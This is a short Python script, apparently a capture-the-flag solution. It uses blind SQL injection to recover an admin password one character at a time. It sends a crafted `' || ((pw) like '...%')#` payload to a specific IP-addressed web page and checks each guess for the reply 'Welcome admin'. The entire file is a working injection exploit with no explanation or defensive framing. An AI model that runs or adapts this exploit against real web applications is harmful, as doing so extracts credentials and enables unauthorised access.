import requests
#http://13.232.71.64/s3cur3acc3ss/
url="http://13.232.71.64/a_w1n_f0r_brut3f0rc3/?pass=' || ((pw) like \'"
pay="1234567890"
passwd=""
while(1):
    corr=0
    for j in pay:
        query=url+passwd+j+"%\')%23"
        print(query)
        http=requests.get(query)
        if "Welcome admin" in http.text:
            passwd=passwd+j
            print(passwd)
            corr+=1
    if corr==0:
        break
print("Final pw : "+passwd)
